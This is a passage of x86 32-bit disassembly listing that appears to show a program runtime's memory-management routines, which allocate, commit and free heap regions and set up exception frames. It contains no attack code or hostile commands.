  401608:	eb 3c                	jmp    0x401646
  40160a:	8b 5e 08             	mov    0x8(%esi),%ebx
  40160d:	8b 7e 0c             	mov    0xc(%esi),%edi
  401610:	03 fb                	add    %ebx,%edi
  401612:	3b eb                	cmp    %ebx,%ebp
  401614:	76 02                	jbe    0x401618
  401616:	8b dd                	mov    %ebp,%ebx
  401618:	3b 7c 24 08          	cmp    0x8(%esp),%edi
  40161c:	76 04                	jbe    0x401622
  40161e:	8b 7c 24 08          	mov    0x8(%esp),%edi
  401622:	3b fb                	cmp    %ebx,%edi
  401624:	76 1e                	jbe    0x401644
  401626:	6a 04                	push   $0x4
  401628:	68 00 10 00 00       	push   $0x1000
  40162d:	2b fb                	sub    %ebx,%edi
  40162f:	57                   	push   %edi
  401630:	53                   	push   %ebx
  401631:	e8 52 fc ff ff       	call   0x401288
  401636:	85 c0                	test   %eax,%eax
  401638:	75 0a                	jne    0x401644
  40163a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40163e:	33 d2                	xor    %edx,%edx
  401640:	89 10                	mov    %edx,(%eax)
  401642:	eb 0a                	jmp    0x40164e
  401644:	8b 36                	mov    (%esi),%esi
  401646:	81 fe 3c c4 40 00    	cmp    $0x40c43c,%esi
  40164c:	75 bc                	jne    0x40160a
  40164e:	83 c4 0c             	add    $0xc,%esp
  401651:	5d                   	pop    %ebp
  401652:	5f                   	pop    %edi
  401653:	5e                   	pop    %esi
  401654:	5b                   	pop    %ebx
  401655:	c3                   	ret
  401656:	8b c0                	mov    %eax,%eax
  401658:	53                   	push   %ebx
  401659:	56                   	push   %esi
  40165a:	57                   	push   %edi
  40165b:	55                   	push   %ebp
  40165c:	51                   	push   %ecx
  40165d:	8b d8                	mov    %eax,%ebx
  40165f:	8b f3                	mov    %ebx,%esi
  401661:	81 c6 ff 0f 00 00    	add    $0xfff,%esi
  401667:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  40166d:	89 34 24             	mov    %esi,(%esp)
  401670:	8b eb                	mov    %ebx,%ebp
  401672:	03 ea                	add    %edx,%ebp
  401674:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40167a:	8b 04 24             	mov    (%esp),%eax
  40167d:	89 01                	mov    %eax,(%ecx)
  40167f:	8b c5                	mov    %ebp,%eax
  401681:	2b 04 24             	sub    (%esp),%eax
  401684:	89 41 04             	mov    %eax,0x4(%ecx)
  401687:	8b 35 3c c4 40 00    	mov    0x40c43c,%esi
  40168d:	eb 38                	jmp    0x4016c7
  40168f:	8b 5e 08             	mov    0x8(%esi),%ebx
  401692:	8b 7e 0c             	mov    0xc(%esi),%edi
  401695:	03 fb                	add    %ebx,%edi
  401697:	3b 1c 24             	cmp    (%esp),%ebx
  40169a:	73 03                	jae    0x40169f
  40169c:	8b 1c 24             	mov    (%esp),%ebx
  40169f:	3b ef                	cmp    %edi,%ebp
  4016a1:	73 02                	jae    0x4016a5
  4016a3:	8b fd                	mov    %ebp,%edi
  4016a5:	3b fb                	cmp    %ebx,%edi
  4016a7:	76 1c                	jbe    0x4016c5
  4016a9:	68 00 40 00 00       	push   $0x4000
  4016ae:	2b fb                	sub    %ebx,%edi
  4016b0:	57                   	push   %edi
  4016b1:	53                   	push   %ebx
  4016b2:	e8 d9 fb ff ff       	call   0x401290
  4016b7:	85 c0                	test   %eax,%eax
  4016b9:	75 0a                	jne    0x4016c5
  4016bb:	c7 05 18 c4 40 00 02 	movl   $0x2,0x40c418
  4016c2:	00 00 00 
  4016c5:	8b 36                	mov    (%esi),%esi
  4016c7:	81 fe 3c c4 40 00    	cmp    $0x40c43c,%esi
  4016cd:	75 c0                	jne    0x40168f
  4016cf:	5a                   	pop    %edx
  4016d0:	5d                   	pop    %ebp
  4016d1:	5f                   	pop    %edi
  4016d2:	5e                   	pop    %esi
  4016d3:	5b                   	pop    %ebx
  4016d4:	c3                   	ret
  4016d5:	8d 40 00             	lea    0x0(%eax),%eax
  4016d8:	53                   	push   %ebx
  4016d9:	56                   	push   %esi
  4016da:	57                   	push   %edi
  4016db:	55                   	push   %ebp
  4016dc:	83 c4 f8             	add    $0xfffffff8,%esp
  4016df:	8b f2                	mov    %edx,%esi
  4016e1:	8b f8                	mov    %eax,%edi
  4016e3:	bd 4c c4 40 00       	mov    $0x40c44c,%ebp
  4016e8:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4016ee:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4016f4:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4016f7:	eb 33                	jmp    0x40172c
  4016f9:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4016fc:	7f 2c                	jg     0x40172a
  4016fe:	8b ce                	mov    %esi,%ecx
  401700:	8b d7                	mov    %edi,%edx
  401702:	8b 43 08             	mov    0x8(%ebx),%eax
  401705:	e8 ba fe ff ff       	call   0x4015c4
  40170a:	83 3e 00             	cmpl   $0x0,(%esi)
  40170d:	74 50                	je     0x40175f
  40170f:	8b 46 04             	mov    0x4(%esi),%eax
  401712:	01 43 08             	add    %eax,0x8(%ebx)
  401715:	8b 46 04             	mov    0x4(%esi),%eax
  401718:	29 43 0c             	sub    %eax,0xc(%ebx)
  40171b:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40171f:	75 3e                	jne    0x40175f
  401721:	8b c3                	mov    %ebx,%eax
  401723:	e8 18 fc ff ff       	call   0x401340
  401728:	eb 35                	jmp    0x40175f
  40172a:	8b 1b                	mov    (%ebx),%ebx
  40172c:	3b dd                	cmp    %ebp,%ebx
  40172e:	75 c9                	jne    0x4016f9
  401730:	8b d6                	mov    %esi,%edx
  401732:	8b c7                	mov    %edi,%eax
  401734:	e8 07 fd ff ff       	call   0x401440
  401739:	83 3e 00             	cmpl   $0x0,(%esi)
  40173c:	74 21                	je     0x40175f
  40173e:	8b cc                	mov    %esp,%ecx
  401740:	8b d6                	mov    %esi,%edx
  401742:	8b c5                	mov    %ebp,%eax
  401744:	e8 03 fc ff ff       	call   0x40134c
  401749:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40174d:	75 a5                	jne    0x4016f4
  40174f:	8b cc                	mov    %esp,%ecx
  401751:	8b 56 04             	mov    0x4(%esi),%edx
  401754:	8b 06                	mov    (%esi),%eax
  401756:	e8 c1 fd ff ff       	call   0x40151c
  40175b:	33 c0                	xor    %eax,%eax
  40175d:	89 06                	mov    %eax,(%esi)
  40175f:	59                   	pop    %ecx
  401760:	5a                   	pop    %edx
  401761:	5d                   	pop    %ebp
  401762:	5f                   	pop    %edi
  401763:	5e                   	pop    %esi
  401764:	5b                   	pop    %ebx
  401765:	c3                   	ret
  401766:	8b c0                	mov    %eax,%eax
  401768:	53                   	push   %ebx
  401769:	56                   	push   %esi
  40176a:	57                   	push   %edi
  40176b:	55                   	push   %ebp
  40176c:	83 c4 ec             	add    $0xffffffec,%esp
  40176f:	89 0c 24             	mov    %ecx,(%esp)
  401772:	8b fa                	mov    %edx,%edi
  401774:	8b f0                	mov    %eax,%esi
  401776:	bd 4c c4 40 00       	mov    $0x40c44c,%ebp
  40177b:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  401781:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  401787:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40178a:	eb 02                	jmp    0x40178e
  40178c:	8b 1b                	mov    (%ebx),%ebx
  40178e:	3b dd                	cmp    %ebp,%ebx
  401790:	74 05                	je     0x401797
  401792:	3b 73 08             	cmp    0x8(%ebx),%esi
  401795:	75 f5                	jne    0x40178c
  401797:	3b 73 08             	cmp    0x8(%ebx),%esi
  40179a:	75 57                	jne    0x4017f3
  40179c:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40179f:	0f 8e 96 00 00 00    	jle    0x40183b
  4017a5:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017a9:	8b d7                	mov    %edi,%edx
  4017ab:	2b 53 0c             	sub    0xc(%ebx),%edx
  4017ae:	8b 43 08             	mov    0x8(%ebx),%eax
  4017b1:	03 43 0c             	add    0xc(%ebx),%eax
  4017b4:	e8 eb fc ff ff       	call   0x4014a4
  4017b9:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4017be:	74 33                	je     0x4017f3
  4017c0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017c4:	8d 54 24 04          	lea    0x4(%esp),%edx
  4017c8:	8b c5                	mov    %ebp,%eax
  4017ca:	e8 7d fb ff ff       	call   0x40134c
  4017cf:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4017d4:	75 b1                	jne    0x401787
  4017d6:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017da:	8b 54 24 08          	mov    0x8(%esp),%edx
  4017de:	8b 44 24 04          	mov    0x4(%esp),%eax
  4017e2:	e8 35 fd ff ff       	call   0x40151c
  4017e7:	8b 04 24             	mov    (%esp),%eax
  4017ea:	33 d2                	xor    %edx,%edx
  4017ec:	89 10                	mov    %edx,(%eax)
  4017ee:	e9 90 00 00 00       	jmp    0x401883
  4017f3:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017f7:	8b d7                	mov    %edi,%edx
  4017f9:	8b c6                	mov    %esi,%eax
  4017fb:	e8 a4 fc ff ff       	call   0x4014a4
  401800:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401805:	74 34                	je     0x40183b
  401807:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40180b:	8d 54 24 04          	lea    0x4(%esp),%edx
  40180f:	8b c5                	mov    %ebp,%eax
  401811:	e8 36 fb ff ff       	call   0x40134c
  401816:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40181b:	0f 85 66 ff ff ff    	jne    0x401787
  401821:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401825:	8b 54 24 08          	mov    0x8(%esp),%edx
  401829:	8b 44 24 04          	mov    0x4(%esp),%eax
  40182d:	e8 ea fc ff ff       	call   0x40151c
  401832:	8b 04 24             	mov    (%esp),%eax
  401835:	33 d2                	xor    %edx,%edx
  401837:	89 10                	mov    %edx,(%eax)
  401839:	eb 48                	jmp    0x401883
  40183b:	8b 6b 08             	mov    0x8(%ebx),%ebp
  40183e:	3b f5                	cmp    %ebp,%esi
  401840:	75 3a                	jne    0x40187c
  401842:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  401845:	7f 35                	jg     0x40187c
  401847:	8b 0c 24             	mov    (%esp),%ecx
  40184a:	8b d7                	mov    %edi,%edx
  40184c:	8b c5                	mov    %ebp,%eax
  40184e:	e8 71 fd ff ff       	call   0x4015c4
  401853:	8b 04 24             	mov    (%esp),%eax
  401856:	83 38 00             	cmpl   $0x0,(%eax)
  401859:	74 28                	je     0x401883
  40185b:	8b 04 24             	mov    (%esp),%eax
  40185e:	8b 40 04             	mov    0x4(%eax),%eax
  401861:	01 43 08             	add    %eax,0x8(%ebx)
  401864:	8b 04 24             	mov    (%esp),%eax
  401867:	8b 40 04             	mov    0x4(%eax),%eax
  40186a:	29 43 0c             	sub    %eax,0xc(%ebx)
  40186d:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  401871:	75 10                	jne    0x401883
  401873:	8b c3                	mov    %ebx,%eax
  401875:	e8 c6 fa ff ff       	call   0x401340
  40187a:	eb 07                	jmp    0x401883
  40187c:	8b 04 24             	mov    (%esp),%eax
  40187f:	33 d2                	xor    %edx,%edx
  401881:	89 10                	mov    %edx,(%eax)
  401883:	83 c4 14             	add    $0x14,%esp
  401886:	5d                   	pop    %ebp
  401887:	5f                   	pop    %edi
  401888:	5e                   	pop    %esi
  401889:	5b                   	pop    %ebx
  40188a:	c3                   	ret
  40188b:	90                   	nop
  40188c:	53                   	push   %ebx
  40188d:	56                   	push   %esi
  40188e:	57                   	push   %edi
  40188f:	83 c4 ec             	add    $0xffffffec,%esp
  401892:	8b f9                	mov    %ecx,%edi
  401894:	89 14 24             	mov    %edx,(%esp)
  401897:	8d 98 ff 3f 00 00    	lea    0x3fff(%eax),%ebx
  40189d:	81 e3 00 c0 ff ff    	and    $0xffffc000,%ebx
  4018a3:	8b 34 24             	mov    (%esp),%esi
  4018a6:	03 f0                	add    %eax,%esi
  4018a8:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  4018ae:	3b de                	cmp    %esi,%ebx
  4018b0:	73 5b                	jae    0x40190d
  4018b2:	8b cf                	mov    %edi,%ecx
  4018b4:	8b d6                	mov    %esi,%edx
  4018b6:	2b d3                	sub    %ebx,%edx
  4018b8:	8b c3                	mov    %ebx,%eax
  4018ba:	e8 99 fd ff ff       	call   0x401658
  4018bf:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4018c3:	8b d7                	mov    %edi,%edx
  4018c5:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  4018ca:	e8 7d fa ff ff       	call   0x40134c
  4018cf:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  4018d3:	85 db                	test   %ebx,%ebx
  4018d5:	74 1f                	je     0x4018f6
  4018d7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4018db:	8b 54 24 08          	mov    0x8(%esp),%edx
  4018df:	8b c3                	mov    %ebx,%eax
  4018e1:	e8 36 fc ff ff       	call   0x40151c
  4018e6:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4018ea:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018ee:	8b 44 24 10          	mov    0x10(%esp),%eax
  4018f2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4018f6:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4018fb:	74 14                	je     0x401911
  4018fd:	8d 54 24 04          	lea    0x4(%esp),%edx
  401901:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401906:	e8 a5 fa ff ff       	call   0x4013b0
  40190b:	eb 04                	jmp    0x401911
  40190d:	33 c0                	xor    %eax,%eax
  40190f:	89 07                	mov    %eax,(%edi)
  401911:	83 c4 14             	add    $0x14,%esp
  401914:	5f                   	pop    %edi
  401915:	5e                   	pop    %esi
  401916:	5b                   	pop    %ebx
  401917:	c3                   	ret
  401918:	55                   	push   %ebp
  401919:	8b ec                	mov    %esp,%ebp
  40191b:	33 d2                	xor    %edx,%edx
  40191d:	55                   	push   %ebp
  40191e:	68 ce 19 40 00       	push   $0x4019ce
  401923:	64 ff 32             	push   %fs:(%edx)
  401926:	64 89 22             	mov    %esp,%fs:(%edx)
  401929:	68 1c c4 40 00       	push   $0x40c41c
  40192e:	e8 65 f9 ff ff       	call   0x401298
  401933:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40193a:	74 0a                	je     0x401946
  40193c:	68 1c c4 40 00       	push   $0x40c41c
  401941:	e8 5a f9 ff ff       	call   0x4012a0
  401946:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  40194b:	e8 b8 f9 ff ff       	call   0x401308
  401950:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401955:	e8 ae f9 ff ff       	call   0x401308
  40195a:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  40195f:	e8 a4 f9 ff ff       	call   0x401308
  401964:	68 f8 0f 00 00       	push   $0xff8
  401969:	6a 00                	push   $0x0
  40196b:	e8 08 f9 ff ff       	call   0x401278
  401970:	a3 74 c4 40 00       	mov    %eax,0x40c474
  401975:	83 3d 74 c4 40 00 00 	cmpl   $0x0,0x40c474
  40197c:	74 2f                	je     0x4019ad
  40197e:	b8 03 00 00 00       	mov    $0x3,%eax
  401983:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  401989:	33 c9                	xor    %ecx,%ecx
  40198b:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  40198f:	40                   	inc    %eax
  401990:	3d 01 04 00 00       	cmp    $0x401,%eax
  401995:	75 ec                	jne    0x401983
  401997:	b8 5c c4 40 00       	mov    $0x40c45c,%eax
  40199c:	89 40 04             	mov    %eax,0x4(%eax)
  40199f:	89 00                	mov    %eax,(%eax)
  4019a1:	a3 68 c4 40 00       	mov    %eax,0x40c468
  4019a6:	c6 05 15 c4 40 00 01 	movb   $0x1,0x40c415
  4019ad:	33 c0                	xor    %eax,%eax
  4019af:	5a                   	pop    %edx
  4019b0:	59                   	pop    %ecx
  4019b1:	59                   	pop    %ecx
  4019b2:	64 89 10             	mov    %edx,%fs:(%eax)
  4019b5:	68 d5 19 40 00       	push   $0x4019d5
  4019ba:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4019c1:	74 0a                	je     0x4019cd
  4019c3:	68 1c c4 40 00       	push   $0x40c41c
  4019c8:	e8 db f8 ff ff       	call   0x4012a8
  4019cd:	c3                   	ret
  4019ce:	e9 8d 13 00 00       	jmp    0x402d60
  4019d3:	eb e5                	jmp    0x4019ba
  4019d5:	a0 15 c4 40 00       	mov    0x40c415,%al
  4019da:	5d                   	pop    %ebp
  4019db:	c3                   	ret
  4019dc:	55                   	push   %ebp
  4019dd:	8b ec                	mov    %esp,%ebp
  4019df:	53                   	push   %ebx
  4019e0:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  4019e7:	0f 84 ce 00 00 00    	je     0x401abb
  4019ed:	33 d2                	xor    %edx,%edx
  4019ef:	55                   	push   %ebp
  4019f0:	68 b4 1a 40 00       	push   $0x401ab4
  4019f5:	64 ff 32             	push   %fs:(%edx)
  4019f8:	64 89 22             	mov    %esp,%fs:(%edx)
  4019fb:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  401a02:	74 0a                	je     0x401a0e
  401a04:	68 1c c4 40 00       	push   $0x40c41c
  401a09:	e8 92 f8 ff ff       	call   0x4012a0
  401a0e:	c6 05 15 c4 40 00 00 	movb   $0x0,0x40c415
  401a15:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401a1a:	50                   	push   %eax
  401a1b:	e8 60 f8 ff ff       	call   0x401280
  401a20:	33 c0                	xor    %eax,%eax
  401a22:	a3 74 c4 40 00       	mov    %eax,0x40c474
  401a27:	8b 1d 3c c4 40 00    	mov    0x40c43c,%ebx
  401a2d:	eb 12                	jmp    0x401a41
  401a2f:	68 00 80 00 00       	push   $0x8000
  401a34:	6a 00                	push   $0x0
  401a36:	8b 43 08             	mov    0x8(%ebx),%eax
  401a39:	50                   	push   %eax
  401a3a:	e8 51 f8 ff ff       	call   0x401290
  401a3f:	8b 1b                	mov    (%ebx),%ebx
  401a41:	81 fb 3c c4 40 00    	cmp    $0x40c43c,%ebx
  401a47:	75 e6                	jne    0x401a2f
  401a49:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  401a4e:	e8 b5 f8 ff ff       	call   0x401308
  401a53:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401a58:	e8 ab f8 ff ff       	call   0x401308
  401a5d:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  401a62:	e8 a1 f8 ff ff       	call   0x401308
  401a67:	a1 34 c4 40 00       	mov    0x40c434,%eax
  401a6c:	85 c0                	test   %eax,%eax
  401a6e:	74 17                	je     0x401a87
  401a70:	8b 10                	mov    (%eax),%edx
  401a72:	89 15 34 c4 40 00    	mov    %edx,0x40c434
  401a78:	50                   	push   %eax
  401a79:	e8 02 f8 ff ff       	call   0x401280
  401a7e:	a1 34 c4 40 00       	mov    0x40c434,%eax
  401a83:	85 c0                	test   %eax,%eax
  401a85:	75 e9                	jne    0x401a70
  401a87:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  401a8e:	83 c4 08             	add    $0x8,%esp
  401a91:	68 bb 1a 40 00       	push   $0x401abb
  401a96:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  401a9d:	74 0a                	je     0x401aa9
  401a9f:	68 1c c4 40 00       	push   $0x40c41c
  401aa4:	e8 ff f7 ff ff       	call   0x4012a8
  401aa9:	68 1c c4 40 00       	push   $0x40c41c
  401aae:	e8 fd f7 ff ff       	call   0x4012b0
  401ab3:	c3                   	ret
  401ab4:	e9 a7 12 00 00       	jmp    0x402d60
  401ab9:	eb db                	jmp    0x401a96
  401abb:	5b                   	pop    %ebx
  401abc:	5d                   	pop    %ebp
  401abd:	c3                   	ret
  401abe:	8b c0                	mov    %eax,%eax
  401ac0:	53                   	push   %ebx
  401ac1:	3b 05 68 c4 40 00    	cmp    0x40c468,%eax
  401ac7:	75 09                	jne    0x401ad2
  401ac9:	8b 50 04             	mov    0x4(%eax),%edx
  401acc:	89 15 68 c4 40 00    	mov    %edx,0x40c468
  401ad2:	8b 50 04             	mov    0x4(%eax),%edx
  401ad5:	8b 48 08             	mov    0x8(%eax),%ecx
  401ad8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401ade:	7f 2a                	jg     0x401b0a
  401ae0:	3b c2                	cmp    %edx,%eax
  401ae2:	75 10                	jne    0x401af4
  401ae4:	c1 e9 02             	shr    $0x2,%ecx
  401ae7:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401aec:	33 d2                	xor    %edx,%edx
  401aee:	89 54 88 f4          	mov    %edx,-0xc(%eax,%ecx,4)
  401af2:	eb 1d                	jmp    0x401b11
  401af4:	c1 e9 02             	shr    $0x2,%ecx
  401af7:	8b 1d 74 c4 40 00    	mov    0x40c474,%ebx
  401afd:	89 54 8b f4          	mov    %edx,-0xc(%ebx,%ecx,4)
  401b01:	8b 00                	mov    (%eax),%eax
  401b03:	89 02                	mov    %eax,(%edx)
  401b05:	89 50 04             	mov    %edx,0x4(%eax)
  401b08:	5b                   	pop    %ebx
  401b09:	c3                   	ret
  401b0a:	8b 00                	mov    (%eax),%eax
  401b0c:	89 02                	mov    %eax,(%edx)
  401b0e:	89 50 04             	mov    %edx,0x4(%eax)
  401b11:	5b                   	pop    %ebx
  401b12:	c3                   	ret
  401b13:	90                   	nop
  401b14:	8b 15 78 c4 40 00    	mov    0x40c478,%edx
  401b1a:	eb 10                	jmp    0x401b2c
  401b1c:	8b 4a 08             	mov    0x8(%edx),%ecx
  401b1f:	3b c1                	cmp    %ecx,%eax
  401b21:	72 07                	jb     0x401b2a
  401b23:	03 4a 0c             	add    0xc(%edx),%ecx
  401b26:	3b c1                	cmp    %ecx,%eax
  401b28:	72 16                	jb     0x401b40
  401b2a:	8b 12                	mov    (%edx),%edx
  401b2c:	81 fa 78 c4 40 00    	cmp    $0x40c478,%edx
  401b32:	75 e8                	jne    0x401b1c
  401b34:	c7 05 18 c4 40 00 03 	movl   $0x3,0x40c418
  401b3b:	00 00 00 
  401b3e:	33 d2                	xor    %edx,%edx
  401b40:	8b c2                	mov    %edx,%eax
  401b42:	c3                   	ret
  401b43:	90                   	nop
  401b44:	53                   	push   %ebx
  401b45:	8b ca                	mov    %edx,%ecx
  401b47:	83 e9 04             	sub    $0x4,%ecx
  401b4a:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401b4d:	83 fa 10             	cmp    $0x10,%edx
  401b50:	7c 0f                	jl     0x401b61
  401b52:	c7 03 07 00 00 80    	movl   $0x80000007,(%ebx)
  401b58:	8b d1                	mov    %ecx,%edx
  401b5a:	e8 a1 01 00 00       	call   0x401d00
  401b5f:	5b                   	pop    %ebx
  401b60:	c3                   	ret
  401b61:	83 fa 04             	cmp    $0x4,%edx
  401b64:	7c 0c                	jl     0x401b72
  401b66:	8b ca                	mov    %edx,%ecx
  401b68:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401b6e:	89 08                	mov    %ecx,(%eax)
  401b70:	89 0b                	mov    %ecx,(%ebx)
  401b72:	5b                   	pop    %ebx
  401b73:	c3                   	ret
  401b74:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401b7a:	8b d0                	mov    %eax,%edx
  401b7c:	83 ea 04             	sub    $0x4,%edx
  401b7f:	8b 12                	mov    (%edx),%edx
  401b81:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401b87:	83 ea 04             	sub    $0x4,%edx
  401b8a:	01 15 00 c4 40 00    	add    %edx,0x40c400
  401b90:	e8 c7 05 00 00       	call   0x40215c
  401b95:	c3                   	ret
  401b96:	8b c0                	mov    %eax,%eax
  401b98:	83 fa 0c             	cmp    $0xc,%edx
  401b9b:	7c 0e                	jl     0x401bab
  401b9d:	83 ca 02             	or     $0x2,%edx
  401ba0:	89 10                	mov    %edx,(%eax)
  401ba2:	83 c0 04             	add    $0x4,%eax
  401ba5:	e8 ca ff ff ff       	call   0x401b74
  401baa:	c3                   	ret
  401bab:	83 fa 04             	cmp    $0x4,%edx
  401bae:	7c 0a                	jl     0x401bba
  401bb0:	8b ca                	mov    %edx,%ecx
  401bb2:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401bb8:	89 08                	mov    %ecx,(%eax)
  401bba:	03 c2                	add    %edx,%eax
  401bbc:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401bbf:	c3                   	ret
  401bc0:	53                   	push   %ebx
  401bc1:	56                   	push   %esi
  401bc2:	8b d0                	mov    %eax,%edx
  401bc4:	83 ea 04             	sub    $0x4,%edx
  401bc7:	8b 12                	mov    (%edx),%edx
  401bc9:	8b ca                	mov    %edx,%ecx
  401bcb:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401bd1:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401bd7:	74 0a                	je     0x401be3
  401bd9:	c7 05 18 c4 40 00 04 	movl   $0x4,0x40c418
  401be0:	00 00 00 
  401be3:	8b da                	mov    %edx,%ebx
  401be5:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401beb:	2b c3                	sub    %ebx,%eax
  401bed:	8b c8                	mov    %eax,%ecx
  401bef:	33 11                	xor    (%ecx),%edx
  401bf1:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401bf7:	74 0a                	je     0x401c03
  401bf9:	c7 05 18 c4 40 00 05 	movl   $0x5,0x40c418
  401c00:	00 00 00 
  401c03:	f6 01 01             	testb  $0x1,(%ecx)
  401c06:	74 20                	je     0x401c28
  401c08:	8b d0                	mov    %eax,%edx
  401c0a:	83 ea 0c             	sub    $0xc,%edx
  401c0d:	8b 72 08             	mov    0x8(%edx),%esi
  401c10:	2b c6                	sub    %esi,%eax
  401c12:	3b 70 08             	cmp    0x8(%eax),%esi
  401c15:	74 0a                	je     0x401c21
  401c17:	c7 05 18 c4 40 00 06 	movl   $0x6,0x40c418
  401c1e:	00 00 00 
  401c21:	e8 9a fe ff ff       	call   0x401ac0
  401c26:	03 de                	add    %esi,%ebx
  401c28:	8b c3                	mov    %ebx,%eax
  401c2a:	5e                   	pop    %esi
  401c2b:	5b                   	pop    %ebx
  401c2c:	c3                   	ret
  401c2d:	8d 40 00             	lea    0x0(%eax),%eax
  401c30:	53                   	push   %ebx
  401c31:	56                   	push   %esi
  401c32:	57                   	push   %edi
  401c33:	8b d8                	mov    %eax,%ebx
  401c35:	33 ff                	xor    %edi,%edi
  401c37:	8b 03                	mov    (%ebx),%eax
  401c39:	a9 00 00 00 80       	test   $0x80000000,%eax
  401c3e:	74 0b                	je     0x401c4b
  401c40:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401c45:	03 f8                	add    %eax,%edi
  401c47:	03 d8                	add    %eax,%ebx
  401c49:	8b 03                	mov    (%ebx),%eax
  401c4b:	a8 02                	test   $0x2,%al
  401c4d:	75 13                	jne    0x401c62
  401c4f:	8b f3                	mov    %ebx,%esi
  401c51:	8b c6                	mov    %esi,%eax
  401c53:	e8 68 fe ff ff       	call   0x401ac0
  401c58:	8b 46 08             	mov    0x8(%esi),%eax
  401c5b:	03 f8                	add    %eax,%edi
  401c5d:	03 d8                	add    %eax,%ebx
  401c5f:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401c62:	8b c7                	mov    %edi,%eax
  401c64:	5f                   	pop    %edi
  401c65:	5e                   	pop    %esi
  401c66:	5b                   	pop    %ebx
  401c67:	c3                   	ret
  401c68:	53                   	push   %ebx
  401c69:	56                   	push   %esi
  401c6a:	57                   	push   %edi
  401c6b:	55                   	push   %ebp
  401c6c:	83 c4 f8             	add    $0xfffffff8,%esp
  401c6f:	8b fa                	mov    %edx,%edi
  401c71:	8b f0                	mov    %eax,%esi
  401c73:	8b c6                	mov    %esi,%eax
  401c75:	e8 9a fe ff ff       	call   0x401b14
  401c7a:	8b d8                	mov    %eax,%ebx
  401c7c:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401c7f:	8b c5                	mov    %ebp,%eax
  401c81:	03 43 0c             	add    0xc(%ebx),%eax
  401c84:	8b d0                	mov    %eax,%edx
  401c86:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  401c89:	2b d1                	sub    %ecx,%edx
  401c8b:	83 fa 0c             	cmp    $0xc,%edx
  401c8e:	7f 04                	jg     0x401c94
  401c90:	8b f8                	mov    %eax,%edi
  401c92:	2b fe                	sub    %esi,%edi
  401c94:	8b c6                	mov    %esi,%eax
  401c96:	2b c5                	sub    %ebp,%eax
  401c98:	83 f8 0c             	cmp    $0xc,%eax
  401c9b:	7d 12                	jge    0x401caf
  401c9d:	8b cc                	mov    %esp,%ecx
  401c9f:	8b d6                	mov    %esi,%edx
  401ca1:	2b 53 08             	sub    0x8(%ebx),%edx
  401ca4:	03 d7                	add    %edi,%edx
  401ca6:	8b c5                	mov    %ebp,%eax
  401ca8:	e8 df fb ff ff       	call   0x40188c
  401cad:	eb 0f                	jmp    0x401cbe
  401caf:	8b cc                	mov    %esp,%ecx
  401cb1:	8b d7                	mov    %edi,%edx
  401cb3:	83 ea 04             	sub    $0x4,%edx
  401cb6:	8d 46 04             	lea    0x4(%esi),%eax
  401cb9:	e8 ce fb ff ff       	call   0x40188c
